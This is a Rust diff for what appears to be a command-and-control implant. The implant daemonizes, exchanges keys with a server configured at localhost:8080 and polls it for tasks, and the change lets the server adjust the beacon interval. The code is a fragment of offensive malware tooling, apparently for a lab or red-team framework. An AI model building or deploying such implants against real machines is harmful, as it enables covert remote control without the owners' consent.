@@ -13,7 +13,6 @@ mod utils;
 pub const PROTOCOL: &str = "http";
 pub const HOST: &str = "localhost";
 pub const PORT: &str = "8080";
-const CHECK_IN_TIME_SECONDS: u64 = 30;
 
 fn main() -> Result<(), errors::ImplantError> {
     Daemonize::new().start().unwrap();
@@ -27,16 +26,21 @@ fn main() -> Result<(), errors::ImplantError> {
     // Exchange key information with server
     let exchange_response = http::exchange::exchange_keys(keypair.1)?;
 
+    let mut check_in_time_secs: u64 = 60;
     loop {
         // Handle tasks
-        tasks::task_handler::handle_available_tasks(
+        let (is_default, temp) = tasks::task_handler::handle_available_tasks(
             &exchange_response.implant_id,
             &keypair.0,
             &exchange_response.public_key,
         )?;
 
+        if !is_default {
+            check_in_time_secs = temp;
+        }
+
         // Sleep
-        let check_in_duration = time::Duration::from_secs(CHECK_IN_TIME_SECONDS);
+        let check_in_duration = time::Duration::from_secs(check_in_time_secs);
 
         thread::sleep(check_in_duration);
     }
